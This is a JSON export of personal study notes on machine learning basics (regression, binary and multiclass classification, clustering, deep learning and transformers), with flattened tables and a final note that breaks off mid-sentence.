{"AI/Binary-Classification":{"slug":"AI/Binary-Classification","filePath":"AI/Binary Classification.md","title":"Binary Classification","links":["AI/Regression","AI/Machine-Learning","AI/Multiclass-Classification"],"tags":[],"content":"What is it?\nClassification, like Regression, is a supervised Machine Learning technique; and therefore follows the same iterative process of training, validating, and evaluating models. Instead of calculating numeric values like a Regression model, the algorithms used to train classification models calculate probability values for class assignment and the evaluation metrics used to assess model performance compare the predicted classes to the actual classes.\nBinary classification algorithms are used to train a model that predicts one of two possible labels for a single class. Essentially, predicting true or false. In most real scenarios, the data observations used to train and validate the model consist of multiple feature (x) values and a y value that is either 1 or 0.\nExample\nTo understand how binary classification works, let’s look at a simplified example that uses a single feature (x) to predict whether the label y is 1 or 0. In this example, we’ll use the blood glucose level of a patient to predict whether or not the patient has diabetes. Here’s the data with which we’ll train the model:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBlood glucose (x)Diabetic? (y)670103111417201161650\nTraining a binary classification model\nTo train the model, we’ll use an algorithm to fit the training data to a function that calculates the probability of the class label being true (in other words, that the patient has diabetes). Probability is measured as a value between 0.0 and 1.0, such that the total probability for all possible classes is 1.0. So for example, if the probability of a patient having diabetes is 0.7, then there’s a corresponding probability of 0.3 that the patient isn’t diabetic.\nThere are many algorithms that can be used for binary classification, such as logistic Regression, which derives a sigmoid (S-shaped) function with values between 0.0 and 1.0, like this:\n\nNote:\nDespite its name, in Machine Learning logistic Regression is used for classification, not Regression. The important point is the logistic nature of the function it produces, which describes an S-shaped curve between a lower and upper value (0.0 and 1.0 when used for binary classification).\nThe function produced by the algorithm describes the probability of y being true (y=1) for a given value of x. Mathematically, you can express the function like this:\nf(x) = P(y=1 | x)\nFor three of the six observations in the training data, we know that y is definitely true, so the probability for those observations that y=1 is 1.0 and for the other three, we know that y is definitely false, so the probability that y=1 is 0.0. The S-shaped curve describes the probability distribution so that plotting a value of x on the line identifies the corresponding probability that y is 1.\nThe diagram also includes a horizontal line to indicate the threshold at which a model based on this function will predict true (1) or false (0). The threshold lies at the mid-point for y (P(y) = 0.5). For any values at this point or above, the model will predict true (1); while for any values below this point it will predict false (0). For example, for a patient with a blood glucose level of 90, the function would result in a probability value of 0.9. Since 0.9 is higher than the threshold of 0.5, the model would predict true (1) - in other words, the patient is predicted to have diabetes.\nEvaluating a binary classification model\nAs with Regression, when training a binary classification model you hold back a random subset of data with which to validate the trained model. Let’s assume we held back the following data to validate our diabetes classifier:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBlood glucose (x)Diabetic? (y)66010711121710871891\nApplying the logistic function we derived previously to the x values results in the following plot.\n\nBased on whether the probability calculated by the function is above or below the threshold, the model generates a predicted label of 1 or 0 for each observation. We can then compare the predicted class labels (ŷ) to the actual class labels (y), as shown here:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBlood glucose (x)Actual diabetes diagnosis (y)Predicted diabetes diagnosis (ŷ)66001071111211710087108911\nBinary classification evaluation metrics\nThe first step in calculating evaluation metrics for a binary classification model is usually to create a matrix of the number of correct and incorrect predictions for each possible class label:\n\nThis visualization is called a confusion matrix, and it shows the prediction totals where:\n\nŷ=0 and y=0: True negatives (TN)\nŷ=1 and y=0: False positives (FP)\nŷ=0 and y=1: False negatives (FN)\nŷ=1 and y=1: True positives (TP)\n\nThe arrangement of the confusion matrix is such that correct (true) predictions are shown in a diagonal line from top-left to bottom-right. Often, color-intensity is used to indicate the number of predictions in each cell, so a quick glance at a model that predicts well should reveal a deeply shaded diagonal trend.\nAccuracy\nThe simplest metric you can calculate from the confusion matrix is accuracy - the proportion of predictions that the model got right. Accuracy is calculated as:\n(TN+TP) ÷ (TN+FN+FP+TP)\nIn the case of our diabetes example, the calculation is:\n\n(2+3) ÷ (2+1+0+3)\n= 5 ÷ 6\n= 0.83\n\nSo for our validation data, the diabetes classification model produced correct predictions 83% of the time.\nAccuracy might initially seem like a good metric to evaluate a model, but consider this. Suppose 11% of the population has diabetes. You could create a model that always predicts 0, and it would achieve an accuracy of 89%, even though it makes no real attempt to differentiate between patients by evaluating their features. What we really need is a deeper understanding of how the model performs at predicting 1 for positive cases and 0 for negative cases.\nRecall\nRecall is a metric that measures the proportion of positive cases that the model identified correctly. In other words, compared to the number of patients who have diabetes, how many did the model predict to have diabetes?\nThe formula for recall is:\nTP ÷ (TP+FN)\nFor our diabetes example:\n\n3 ÷ (3+1)\n= 3 ÷ 4\n= 0.75\n\nSo our model correctly identified 75% of patients who have diabetes as having diabetes.\nPrecision\nPrecision is a similar metric to recall, but measures the proportion of predicted positive cases where the true label is actually positive. In other words, what proportion of the patients predicted by the model to have diabetes actually have diabetes?\nThe formula for precision is:\nTP ÷ (TP+FP)\nFor our diabetes example:\n\n3 ÷ (3+0)\n= 3 ÷ 3\n= 1.0\n\nSo 100% of the patients predicted by our model to have diabetes do in fact have diabetes.\nF1-score\nF1-score is an overall metric that combined recall and precision. The formula for F1-score is:\n(2 x Precision x Recall) ÷ (Precision + Recall)\nFor our diabetes example:\n\n(2 x 1.0 x 0.75) ÷ (1.0 + 0.75)\n= 1.5 ÷ 1.75\n= 0.86\n\nArea Under the Curve (AUC)\nAnother name for recall is the true positive rate (TPR), and there’s an equivalent metric called the false positive rate (FPR) that is calculated as FP÷(FP+TN). We already know that the TPR for our model when using a threshold of 0.5 is 0.75, and we can use the formula for FPR to calculate a value of 0÷2 = 0.\nOf course, if we were to change the threshold above which the model predicts true (1), it would affect the number of positive and negative predictions; and therefore change the TPR and FPR metrics. These metrics are often used to evaluate a model by plotting a received operator characteristic (ROC) curve that compares the TPR and FPR for every possible threshold value between 0.0 and 1.0:\n\nThe ROC curve for a perfect model would go straight up the TPR axis on the left and then across the FPR axis at the top. Since the plot area for the curve measures 1x1, the area under this perfect curve would be 1.0 (meaning that the model is correct 100% of the time). In contrast, a diagonal line from the bottom-left to the top-right represents the results that would be achieved by randomly guessing a binary label; producing an area under the curve of 0.5. In other words, given two possible class labels, you could reasonably expect to guess correctly 50% of the time.\nIn the case of our diabetes model, the curve above is produced, and the area under the curve (AUC) metric is 0.875. Since the AUC is higher than 0.5, we can conclude the model performs better at predicting whether or not a patient has diabetes than randomly guessing.\n\nNext: Multiclass Classification"},"AI/Clustering":{"slug":"AI/Clustering","filePath":"AI/Clustering.md","title":"Clustering","links":["AI/Machine-Learning","AI/Deep-learning"],"tags":[],"content":"Clustering is a form of unsupervised Machine Learning in which observations are grouped into clusters based on similarities in their data values, or features. This kind of Machine Learning is considered unsupervised because it doesn’t make use of previously known label values to train a model. In a clustering model, the label is the cluster to which the observation is assigned, based only on its features.\nExample\nFor example, suppose a botanist observes a sample of flowers and records the number of leaves and petals on each flower:\n\nThere are no known labels in the dataset, just two features. The goal is not to identify the different types (species) of flower; just to group similar flowers together based on the number of leaves and petals.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nLeaves (x1)Petals (x2)050613131618232728\nTraining a clustering model\nThere are multiple algorithms you can use for clustering. One of the most commonly used algorithms is K-Means clustering, which consists of the following steps:\n\nThe feature (x) values are vectorized to define n-dimensional coordinates (where n is the number of features). In the flower example, we have two features: number of leaves (x1) and number of petals (x2). So, the feature vector has two coordinates that we can use to conceptually plot the data points in two-dimensional space ([x1,x2])\nYou decide how many clusters you want to use to group the flowers - call this value k. For example, to create three clusters, you would use a k value of 3. Then k points are plotted at random coordinates. These points become the center points for each cluster, so they’re called centroids.\nEach data point (in this case a flower) is assigned to its nearest centroid.\nEach centroid is moved to the center of the data points assigned to it based on the mean distance between the points.\nAfter the centroid is moved, the data points may now be closer to a different centroid, so the data points are reassigned to clusters based on the new closest centroid.\nThe centroid movement and cluster reallocation steps are repeated until the clusters become stable or a predetermined maximum number of iterations is reached.\n\nThe following animation shows this process:\n\nEvaluating a clustering model\nSince there’s no known label with which to compare the predicted cluster assignments, evaluation of a clustering model is based on how well the resulting clusters are separated from one another.\nThere are multiple metrics that you can use to evaluate cluster separation, including:\n\nAverage distance to cluster center: How close, on average, each point in the cluster is to the centroid of the cluster.\nAverage distance to other center: How close, on average, each point in the cluster is to the centroid of all other clusters.\nMaximum distance to cluster center: The furthest distance between a point in the cluster and its centroid.\nSilhouette: A value between -1 and 1 that summarizes the ratio of distance between points in the same cluster and points in different clusters (The closer to 1, the better the cluster separation).\n\n\nNext: Deep learning"},"AI/Deep-learning":{"slug":"AI/Deep-learning","filePath":"AI/Deep learning.md","title":"Deep learning","links":["AI/Machine-Learning","AI/Regression","AI/Transformers"],"tags":[],"content":"Deep learning is an advanced form of Machine Learning that tries to emulate the way the human brain learns. The key to deep learning is the creation of an artificial neural network that simulates electrochemical activity in biological neurons by using mathematical functions, as shown here.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBiological neural networkArtificial neural networkNeurons fire in response to electrochemical stimuli. When fired, the signal is passed to connected neurons.Each neuron is a function that operates on an input value (x) and a weight (w). The function is wrapped in an activation function that determines whether to pass the output on.\nArtificial neural networks are made up of multiple layers of neurons - essentially defining a deeply nested function. This architecture is the reason the technique is referred to as deep learning and the models produced by it are often referred to as deep neural networks (DNNs). You can use deep neural networks for many kinds of Machine Learning problem, including Regression and classification, as well as more specialized models for natural language processing and computer vision.\nJust like other Machine Learning techniques discussed in this module, deep learning involves fitting training data to a function that can predict a label (y) based on the value of one or more features (x). The function (f(x)) is the outer layer of a nested function in which each layer of the neural network encapsulates functions that operate on x and the weight (w) values associated with them. The algorithm used to train the model involves iteratively feeding the feature values (x) in the training data forward through the layers to calculate output values for ŷ, validating the model to evaluate how far off the calculated ŷ values are from the known y values (which quantifies the level of error, or loss, in the model), and then modifying the weights (w) to reduce the loss. The trained model includes the final weight values that result in the most accurate predictions.\nExample - Using deep learning for classification\nTo better understand how a deep neural network model works, let’s explore an example in which a neural network is used to define a classification model for penguin species.\n\nThe feature data (x) consists of some measurements of a penguin. Specifically, the measurements are:\n\nThe length of the penguin’s bill.\nThe depth of the penguin’s bill.\nThe length of the penguin’s flippers.\nThe penguin’s weight.\n\nIn this case, x is a vector of four values, or mathematically, x=[x1,x2,x3,x4].\nThe label we’re trying to predict (y) is the species of the penguin, and that there are three possible species it could be:\n\nAdelie\nGentoo\nChinstrap\n\nThis is an example of a classification problem, in which the Machine Learning model must predict the most probable class to which an observation belongs. A classification model accomplishes this by predicting a label that consists of the probability for each class. In other words, y is a vector of three probability values; one for each of the possible classes: [P(y=0|x), P(y=1|x), P(y=2|x)].\nThe process for inferencing a predicted penguin class using this network is:\n\nThe feature vector for a penguin observation is fed into the input layer of the neural network, which consists of a neuron for each x value. In this example, the following x vector is used as the input: [37.3, 16.8, 19.2, 30.0]\nThe functions for the first layer of neurons each calculate a weighted sum by combining the x value and w weight, and pass it to an activation function that determines if it meets the threshold to be passed on to the next layer.\nEach neuron in a layer is connected to all of the neurons in the next layer (an architecture sometimes called a fully connected network) so the results of each layer are fed forward through the network until they reach the output layer.\nThe output layer produces a vector of values; in this case, using a softmax or similar function to calculate the probability distribution for the three possible classes of penguin. In this example, the output vector is: [0.2, 0.7, 0.1]\nThe elements of the vector represent the probabilities for classes 0, 1, and 2. The second value is the highest, so the model predicts that the species of the penguin is 1 (Gentoo).\n\nHow does a neural network learn?\nThe weights in a neural network are central to how it calculates predicted values for labels. During the training process, the model learns the weights that will result in the most accurate predictions. Let’s explore the training process in a little more detail to understand how this learning takes place.\n\n\nThe training and validation datasets are defined, and the training features are fed into the input layer.\nThe neurons in each layer of the network apply their weights (which are initially assigned randomly) and feed the data through the network.\nThe output layer produces a vector containing the calculated values for ŷ. For example, an output for a penguin class prediction might be [0.3. 0.1. 0.6].\nA loss function is used to compare the predicted ŷ values to the known y values and aggregate the difference (which is known as the loss). For example, if the known class for the case that returned the output in the previous step is Chinstrap, then the y value should be [0.0, 0.0, 1.0]. The absolute difference between this and the ŷ vector is [0.3, 0.1, 0.4]. In reality, the loss function calculates the aggregate variance for multiple cases and summarizes it as a single loss value.\nSince the entire network is essentially one large nested function, an optimization function can use differential calculus to evaluate the influence of each weight in the network on the loss, and determine how they could be adjusted (up or down) to reduce the amount of overall loss. The specific optimization technique can vary, but usually involves a gradient descent approach in which each weight is increased or decreased to minimize the loss.\nThe changes to the weights are backpropagated to the layers in the network, replacing the previously used values.\nThe process is repeated over multiple iterations (known as epochs) until the loss is minimized and the model predicts acceptably accurately.\n\nNote\nWhile it’s easier to think of each case in the training data being passed through the network one at a time, in reality the data is batched into matrices and processed using linear algebraic calculations. For this reason, neural network training is best performed on computers with graphical processing units (GPUs) that are optimized for vector and matrix manipulation.\n\nNext: Transformers"},"AI/Foundations-of-AI":{"slug":"AI/Foundations-of-AI","filePath":"AI/Foundations of AI.md","title":"Foundations of AI","links":["AI/Regression"],"tags":[],"content":"Modern AI is built on a foundation of data science and machine learning. The primary goal of AI is to use machines for capabilities that are usually associated with humans. Let’s see data science concepts support the foundation of AI.\nWhat is data science?\nData science is an interdisciplinary field whose aim is to achieve AI. It primarily uses machine learning and statistics techniques. In most cases, data scientists are the experts in charge of solving AI problems.\nWhat is machine learning?\nMachine learning is a technique where a machine sifts through numerous amounts of data to find patterns. This technique is frequently used for AI purposes. Machine learning uses algorithms that train a machine to learn patterns based on differentiating features about the data. The more training data, the more accurate the predictions.\nHere are some examples:\n\nEmail spam detection - Machine learning could look for patterns where email has words like “free” or “guarantee”, the email address domain is on a blocked list, or a link displayed in text doesn’t match the URL behind it.\nCredit card fraud detection - Machine learning could look for patterns like the spending in a zip code the owner doesn’t usually visit, buying an expensive item, or a sudden shopping spree.\n\nWhat is deep learning?\nDeep learning is a subset of machine learning. Deep learning is imitating how a human brain processes information, as a connected artificial neural network. Unlike machine learning, deep learning can discover complex patterns and differentiating features about the data on its own. It normally works with unstructured data like images, text, and audio. It requires enormous amounts of data for better analysis and massive computing power for speed.\nFor instance, deep learning can be used to detect cancerous cells in medical images. Deep learning scans every pixel in the image as input to the neural nodes. The nodes analyze each pixel to filter out features that look cancerous. Each layer of nodes pushes findings of potential cancerous cells to the next layer of nodes to repeat the process and eventually aggregate all of the findings to classify the image. For example, the image might be classified as a healthy image or an image with cancerous features.\n\nNext: Regression"},"AI/Machine-Learning":{"slug":"AI/Machine-Learning","filePath":"AI/Machine Learning.md","title":"Machine Learning","links":[],"tags":[],"content":"Fundamentally, a machine learning model is a software application that encapsulates a function to calculate an output value based on one or more input values. The process of defining that function is known as training. After the function has been defined, you can use it to predict new values in a process called inferencing.\nTypes of Machine Learning\nA breakdown of common types of machine learning is shown in the following diagram.\n\nSupervised machine learning\nSupervised machine learning is a general term for machine learning algorithms in which the training data includes both feature values and known label values. Supervised machine learning is used to train models by determining a relationship between the features and labels in past observations, so that unknown labels can be predicted for features in future cases.\nRegression\nRegression is a form of supervised machine learning in which the label predicted by the model is a numeric value. For example:\n\nThe number of ice creams sold on a given day, based on the temperature, rainfall, and windspeed.\nThe selling price of a property based on its size in square feet, the number of bedrooms it contains, and socio-economic metrics for its location.\nThe fuel efficiency (in miles-per-gallon) of a car based on its engine size, weight, width, height, and length.\n\nClassification\nClassification is a form of supervised machine learning in which the label represents a categorization, or class. There are two common classification scenarios.\nBinary classification\nIn binary classification, the label determines whether the observed item is (or isn’t) an instance of a specific class. Or put another way, binary classification models predict one of two mutually exclusive outcomes. For example:\n\nWhether a patient is at risk for diabetes based on clinical metrics like weight, age, blood glucose level, and so on.\nWhether a bank customer will default on a loan based on income, credit history, age, and other factors.\nWhether a mailing list customer will respond positively to a marketing offer based on demographic attributes and past purchases.\n\nIn all of these examples, the model predicts a binary true/false or positive/negative prediction for a single possible class.\nMulticlass classification\nMulticlass classification extends binary classification to predict a label that represents one of multiple possible classes. For example,\n\nThe species of a penguin (Adelie, Gentoo, or Chinstrap) based on its physical measurements.\nThe genre of a movie (comedy, horror, romance, adventure, or science fiction) based on its cast, director, and budget.\n\nIn most scenarios that involve a known set of multiple classes, multiclass classification is used to predict mutually exclusive labels. For example, a penguin can’t be both a Gentoo and an Adelie. However, there are also some algorithms that you can use to train multilabel classification models, in which there may be more than one valid label for a single observation. For example, a movie could potentially be categorized as both science fiction and comedy.\nUnsupervised machine learning\nUnsupervised machine learning involves training models using data that consists only of feature values without any known labels. Unsupervised machine learning algorithms determine relationships between the features of the observations in the training data.\nClustering\nThe most common form of unsupervised machine learning is clustering. A clustering algorithm identifies similarities between observations based on their features, and groups them into discrete clusters. For example:\n\nGroup similar flowers based on their size, number of leaves, and number of petals.\nIdentify groups of similar customers based on demographic attributes and purchasing behavior.\n\nIn some ways, clustering is similar to multiclass classification; in that it categorizes observations into discrete groups. The difference is that when using classification, you already know the classes to which the observations in the training data belong; so the algorithm works by determining the relationship between the features and the known classification label. In clustering, there’s no previously known cluster label and the algorithm groups the data observations based purely on similarity of features.\nIn some cases, clustering is used to determine the set of classes that exist before training a classification model. For example, you might use clustering to segment your customers into groups, and then analyze those groups to identify and categorize different classes of customer (high value - low volume, frequent small purchaser, and so on). You could then use your categorizations to label the observations in your clustering results and use the labeled data to train a classification model that predicts to which customer category a new customer might belong."},"AI/Multiclass-Classification":{"slug":"AI/Multiclass-Classification","filePath":"AI/Multiclass Classification.md","title":"Multiclass Classification","links":["AI/Machine-Learning","AI/Regression","AI/Binary-Classification","AI/Clustering"],"tags":[],"content":"Multiclass classification is used to predict to which of multiple possible classes an observation belongs. As a supervised Machine Learning technique, it follows the same iterative train, validate, and evaluate process as Regression and Binary Classification in which a subset of the training data is held back to validate the trained model.\nExample\nMulticlass classification algorithms are used to calculate probability values for multiple class labels, enabling a model to predict the most probable class for a given observation.\nLet’s explore an example in which we have some observations of penguins, in which the flipper length (x) of each penguin is recorded. For each observation, the data includes the penguin species (y), which is encoded as follows:\n\n0: Adelie\n1: Gentoo\n2: Chinstrap\n\nNote:\nA real scenario would include multiple feature (x) values. We’ll use a single feature to keep things simple.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFlipper length (x)Species (y)1670172022521971189123221580\nTraining a multiclass classification model\nTo train a multiclass classification model, we need to use an algorithm to fit the training data to a function that calculates a probability value for each possible class. There are two kinds of algorithm you can use to do this:\n\nOne-vs-Rest (OvR) algorithms\nMultinomial algorithms\n\nOne-vs-Rest (OvR) algorithms\nOne-vs-Rest algorithms train a Binary Classification function for each class, each calculating the probability that the observation is an example of the target class. Each function calculates the probability of the observation being a specific class compared to any other class. For our penguin species classification model, the algorithm would essentially create three Binary Classification functions:\n\nf0(x) = P(y=0 | x)\nf1(x) = P(y=1 | x)\nf2(x) = P(y=2 | x)\n\nEach algorithm produces a sigmoid function that calculates a probability value between 0.0 and 1.0. A model trained using this kind of algorithm predicts the class for the function that produces the highest probability output.\nMultinomial algorithms\nAs an alternative approach is to use a multinomial algorithm, which creates a single function that returns a multi-valued output. The output is a vector (an array of values) that contains the probability distribution for all possible classes - with a probability score for each class which when totaled add up to 1.0:\nf(x) =[P(y=0|x), P(y=1|x), P(y=2|x)]\nAn example of this kind of function is a softmax function, which could produce an output like the following example:\n[0.2, 0.3, 0.5]\nThe elements in the vector represent the probabilities for classes 0, 1, and 2 respectively; so in this case, the class with the highest probability is 2.\nRegardless of which type of algorithm is used, the model uses the resulting function to determine the most probable class for a given set of features (x) and predicts the corresponding class label (y).\nEvaluating a multiclass classification model\nYou can evaluate a multiclass classifier by calculating Binary Classification metrics for each individual class. Alternatively, you can calculate aggregate metrics that take all classes into account.\nLet’s assume that we’ve validated our multiclass classifier, and obtained the following results:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFlipper length (x)Actual species (y)Predicted species (ŷ)16500171002052119511183112212221422\nThe confusion matrix for a multiclass classifier is similar to that of a binary classifier, except that it shows the number of predictions for each combination of predicted (ŷ) and actual class labels (y):\n\nFrom this confusion matrix, we can determine the metrics for each individual class as follows:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nClassTPTNFPFNAccuracyRecallPrecisionF1-Score025001.01.01.01.0124100.861.00.670.8224010.860.671.00.8\nTo calculate the overall accuracy, recall, and precision metrics, you use the total of the TP, TN, FP, and FN metrics:\n\nOverall accuracy = (13+6)÷(13+6+1+1) = 0.90\nOverall recall = 6÷(6+1) = 0.86\nOverall precision = 6÷(6+1) = 0.86\n\nThe overall F1-score is calculated using the overall recall and precision metrics:\n\nOverall F1-score = (2x0.86x0.86)÷(0.86+0.86) = 0.86\n\n\nNext: Clustering"},"AI/Regression":{"slug":"AI/Regression","filePath":"AI/Regression.md","title":"Regression","links":["AI/Machine-Learning","AI/Binary-Classification"],"tags":[],"content":"Regression models are trained to predict numeric label values based on training data that includes both features and known labels.\nTraining a regression model\nProcess\n\nThe diagram shows four key elements of the training process for supervised Machine Learning models:\n\nSplit the training data (randomly) to create a dataset with which to train the model while holding back a subset of the data that you’ll use to validate the trained model.\nUse an algorithm to fit the training data to a model. In the case of a regression model, use a regression algorithm such as linear regression.\nUse the validation data you held back to test the model by predicting labels for the features.\nCompare the known actual labels in the validation dataset to the labels that the model predicted. Then aggregate the differences between the predicted and actual label values to calculate a metric that indicates how accurately the model predicted for the validation data.\n\nExample\nWe’ll start by splitting the data and using a subset of it to train a model. Here’s the training dataset:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTemperature (x)Ice cream sales (y)51165146920722375268130\nTo get an insight of how these x and y values might relate to one another, we can plot them as coordinates along two axes, like this:\n\nNow we’re ready to apply an algorithm to our training data and fit it to a function that applies an operation to x to calculate y. One such algorithm is linear regression, which works by deriving a function that produces a straight line through the intersections of the x and y values while minimizing the average distance between the line and the plotted points, like this:\n\nThe line is a visual representation of the function in which the slope of the line describes how to calculate the value of y for a given value of x. The line intercepts the x axis at 50, so when x is 50, y is 0. As you can see from the axis markers in the plot, the line slopes so that every increase of 5 along the x axis results in an increase of 5 up the y axis; so when x is 55, y is 5; when x is 60, y is 10, and so on. To calculate a value of y for a given value of x, the function simply subtracts 50; in other words, the function can be expressed like this:\nf(x) = x-50\nYou can use this function to predict the number of ice creams sold on a day with any given temperature. For example, suppose the weather forecast tells us that tomorrow it will be 77 degrees. We can apply our model to calculate 77-50 and predict that we’ll sell 27 ice creams tomorrow.\nBut just how accurate is our model?\nRegression evaluation metrics\nBased on the differences between the predicted and actual values, you can calculate some common metrics that are used to evaluate a regression model.\nMean Absolute Error (MAE)\nThe variance in this example indicates by how many ice creams each prediction was wrong. It doesn’t matter if the prediction was over or under the actual value (so for example, -3 and +3 both indicate a variance of 3). This metric is known as the absolute error for each prediction, and can be summarized for the whole validation set as the mean absolute error (MAE).\nIn the ice cream example, the mean (average) of the absolute errors (2, 3, 3, 1, 2, and 3) is 2.33.\nMean Squared Error (MSE)\nThe mean absolute error metric takes all discrepancies between predicted and actual labels into account equally. However, it may be more desirable to have a model that is consistently wrong by a small amount than one that makes fewer, but larger errors. One way to produce a metric that “amplifies” larger errors by squaring the individual errors and calculating the mean of the squared values. This metric is known as the mean squared error (MSE).\nIn our ice cream example, the mean of the squared absolute values (which are 4, 9, 9, 1, 4, and 9) is 6.\nRoot Mean Squared Error (RMSE)\nThe mean squared error helps take the magnitude of errors into account, but because it squares the error values, the resulting metric no longer represents the quantity measured by the label. In other words, we can say that the MSE of our model is 6, but that doesn’t measure its accuracy in terms of the number of ice creams that were mis predicted; 6 is just a numeric score that indicates the level of error in the validation predictions.\nIf we want to measure the error in terms of the number of ice creams, we need to calculate the square root of the MSE; which produces a metric called, unsurprisingly, Root Mean Squared Error. In this case √6, which is 2.45 (ice creams).\nCoefficient of determination (R2)\nAll of the metrics so far compare the discrepancy between the predicted and actual values in order to evaluate the model. However, in reality, there’s some natural random variance in the daily sales of ice cream that the model takes into account. In a linear regression model, the training algorithm fits a straight line that minimizes the mean variance between the function and the known label values. The coefficient of determination (more commonly referred to as R2 or R-Squared) is a metric that measures the proportion of variance in the validation results that can be explained by the model, as opposed to some anomalous aspect of the validation data (for example, a day with a highly unusual number of ice creams sales because of a local festival).\nThe calculation for R2 is more complex than for the previous metrics. It compares the sum of squared differences between predicted and actual labels with the sum of squared differences between the actual label values and the mean of actual label values, like this:\nR2 = 1- ∑(y-ŷ)2 ÷ ∑(y-ȳ)2\nThe result of metric is a value between 0 and 1 that describes the proportion of variance explained by the model. In simple terms, the closer to 1 this value is, the better the model is fitting the validation data. In the case of the ice cream regression model, the R2 calculated from the validation data is 0.95.\n\nNext: Binary Classification"},"AI/Transformers":{"slug":"AI/Transformers","filePath":"AI/Transformers.md","title":"Transformers","links":[],"tags":[],"content":"Generative AI applications are powered by language models, which are a specialized type of machine learning model that you can use to perform natural language processing (NLP) tasks, including:\n\nDetermining sentiment or otherwise classifying natural language text.\nSummarizing text.\nComparing multiple text sources for semantic similarity.\nGenerating new natural language.\n\nWhile the mathematical principles behind these language models can be complex, a basic understanding of the architecture used to implement them can help you gain a conceptual understanding of how they work.\nTransformer models\nMachine learning models for natural language processing have evolved over many years. Today’s cutting-edge large language models are based on the transformer architecture, which builds on and extends some techniques that have been proven successful in modeling vocabularies to support NLP tasks - and in particular in generating language. Transformer models are trained with large volumes of text, enabling them to represent the semantic relationships between words and use those relationships to determine probable sequences of text that make sense. Transformer models with a large enough vocabulary are capable of generating language responses that are tough to distinguish from human responses.\nTransformer model architecture consists of two components, or blocks:\n\nAn encoder block that creates semantic representations of the training vocabulary.\nA decoder block that generates new language sequences.\n\n\n\nThe model is trained with a large volume of natural language text, often sourced from the internet or other public sources of text.\nThe sequences of text are broken down into tokens (for example, individual words) and the encoder block processes these token sequences using a technique called attention to determine relationships between tokens (for example, which tokens influence the presence of other tokens in a sequence, different tokens that are commonly used in the same context, and so on.)\nThe output from the encoder is a collection of vectors (multi-valued numeric arrays) in which each element of the vector represents a semantic attribute of the tokens. These vectors are referred to as embeddings.\nThe decoder block works on a new sequence of text tokens and uses the embeddings generated by the encoder to generate an appropriate natural language output.\nFor example, given an input sequence like &quot;When my dog was&quot;, the model can use the attention technique to analyze the input tokens and the semantic attributes encoded in the embeddings to predict an appropriate completion of the sentence, such as &quot;a puppy&quot;.\n\nIn practice, the specific implementations of the architecture vary – for example, the Bidirectional Encoder Representations from Transformers (BERT) model developed by Google to support their search engine uses only the encoder block, while the Generative Pretrained Transformer (GPT) model developed by OpenAI uses only the decoder block.\nWhile a complete explanation of every aspect of transformer models is beyond the scope of this module, an explanation of some of the key elements in a transformer can help you get a sense for how they support generative AI.\nTokenization\nThe first step in training a transformer model is to decompose the training text into tokens - in other words, identify each unique text value. For the sake of simplicity, you can think of each distinct word in the training text as a token (though in reality, tokens can be generated for partial words, or combinations of words and punctuation).\nFor example, consider the following sentence:\nI heard a dog bark loudly at a cat\nTo tokenize this text, you can identify each discrete word and assign token IDs to them. For example:\n- I (1)\n- heard (2)\n- a (3)\n- dog (4)\n- bark (5)\n- loudly (6)\n- at (7)\n- (&quot;a&quot; is already tokenized as 3)\n- cat (8)\n\nThe sentence can now be represented with the tokens: {1 2 3 4 5 6 7 3 8}. Similarly, the sentence &quot;I heard a cat&quot; could be represented as {1 2 3 8}.\nAs you continue to train the model, each new token in the training text is added to the vocabulary with appropriate token IDs:\n- meow (9)\n- skateboard (10)\n- *and so on...*\n\nWith a sufficiently large set of training text, a vocabulary of many thousands of tokens could be compiled.\nEmbeddings\nWhile it may be convenient to represent tokens as simple IDs - essentially creating an index for all the words in the vocabulary, they don’t tell us anything about the meaning of the words, or the relationships between them. To create a vocabulary that encapsulates semantic relationships between the tokens, we define contextual vectors, known as embeddings, for them. Vectors are multi-valued numeric representations of information, for example [10, 3, 1] in which each numeric element represents a particular attribute of the information. For language tokens, each element of a token’s vector represents some semantic attribute of the token. The specific categories for the elements of the vectors in a language model are determined during training based on how commonly words are used together or in similar contexts.\nVectors represent lines in multidimensional space, describing direction and distance along multiple axes (you can impress your mathematician friends by calling these amplitude and magnitude). It can be useful to think of the elements in an embedding vector for a token as representing steps along a path in multidimensional space. For example, a vector with three elements represents a path in 3-dimensional space in which the element values indicate the units traveled forward/back, left/right, and up/down. Overall, the vector describes the direction and distance of the path from origin to end.\nThe elements of the tokens in the embeddings space each represent some semantic attribute of the token, so that semantically similar tokens should result in vectors that have a similar orientation – in other words they point in the same direction. A technique called cosine similarity is used to determine if two vectors have similar directions (regardless of distance), and therefore represent semantically linked words. As a simple example, suppose the embeddings for our tokens consist of vectors with three elements, for example:\n- 4 (&quot;dog&quot;): [10,3,2]\n- 8 (&quot;cat&quot;): [10,3,1]\n- 9 (&quot;puppy&quot;): [5,2,1]\n- 10 (&quot;skateboard&quot;): [-3,3,2]\n\nWe can plot these vectors in three-dimensional space, like this:\n\nThe embedding vectors for &quot;dog&quot; and &quot;puppy&quot; describe a path along an almost identical direction, which is also fairly similar to the direction for &quot;cat&quot;. The embedding vector for &quot;skateboard&quot; however describes journey in a very different direction.\nNote\nThe previous example shows a simple example model in which each embedding has only three dimensions. Real language models have many more dimensions.\nThere are multiple ways you can calculate appropriate embeddings for a given set of tokens, including language modeling algorithms like Word2Vec or the encoder block in a transformer 